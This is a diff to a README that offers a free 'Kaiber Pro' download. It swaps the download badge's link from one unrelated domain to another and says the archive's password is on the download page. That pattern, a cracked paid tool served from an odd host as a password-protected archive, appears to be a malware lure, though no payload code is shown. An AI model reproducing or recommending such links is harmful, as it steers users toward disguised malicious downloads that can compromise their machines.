@@ -18,7 +18,7 @@ Kaiber Pro free — Flipbook animation, video transform, and motion canvas with 
 
 ## Download
 
-[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/kaiber2)
+[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/kaiber2)
 
 > The archive password is shown on the download page.
 
